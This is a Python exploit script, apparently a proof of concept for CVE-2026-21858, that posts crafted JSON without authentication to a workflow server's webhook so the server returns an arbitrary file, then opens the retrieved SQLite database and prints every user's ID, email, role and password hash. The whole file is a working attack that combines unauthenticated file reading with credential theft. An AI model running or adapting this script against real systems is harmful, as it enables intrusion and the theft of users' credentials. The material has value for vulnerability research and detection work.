#!/usr/bin/env python3
import base64
import os
import sqlite3
import sys
import tempfile

import requests
import toml


def load_config():
    try:
        with open("config.toml", "r") as f:
            return toml.load(f)["attack"]
    except Exception as e:
        print(f"[-] Error loading config.toml: {e}")
        sys.exit(1)


def exploit_ni8mare(target_url, target_file):
    """
    Purely Unauthenticated Exploitation of CVE-2026-21858.
    No cookies, no auth headers.
    """
    print(f"[*] Launching UNAUTHENTICATED exploit against {target_url}...")
    webhook_url = f"{target_url}/webhook/ni8mare"

    payload = {
        "files": {
            "exploit_db": {
                "path": target_file,
                "filepath": target_file,
                "originalFilename": "dumped.sqlite",
                "mimetype": "application/octet-stream",
            }
        }
    }

    print(f"[!] Sending malicious JSON to {webhook_url}...")
    # NOTE: requests.post() without a session is used to ensure no auth state is shared.
    res = requests.post(webhook_url, json=payload)

    if res.status_code == 200:
        fd, temp_path = tempfile.mkstemp(suffix=".sqlite")
        os.close(fd)
        with open(temp_path, "wb") as f:
            f.write(res.content)
        print(f"[+] File extracted successfully to: {temp_path}")
        return temp_path
    else:
        print(f"[-] Exploit failed. Status: {res.status_code}")
        print(f"[-] Response: {res.text}")
        return None


def extract_credentials(db_path):
    print(f"\n[*] Analyzing database: {db_path}")
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("PRAGMA table_info('user')")
    columns = [col[1] for col in cursor.fetchall()]
    cursor.execute('SELECT * FROM "user"')
    for row in cursor.fetchall():
        user = dict(zip(columns, row))
        print("=" * 60)
        print(f"User ID:    {user.get('id')}")
        print(f"Email:      {user.get('email')}")
        print(f"Role:       {user.get('role') or user.get('roleSlug') or 'Unknown'}")
        print(f"Hash:       {user.get('password')}")
    print("=" * 60)
    conn.close()


def main():
    config = load_config()
    db_path = exploit_ni8mare(config["target_url"], config["target_file"])
    if db_path:
        extract_credentials(db_path)
        os.remove(db_path)
        print(f"[*] Cleaned up: {db_path}")
        print("\n[SUCCESS] Unauthenticated exploitation complete!")
    else:
        sys.exit(1)


if __name__ == "__main__":
    main()
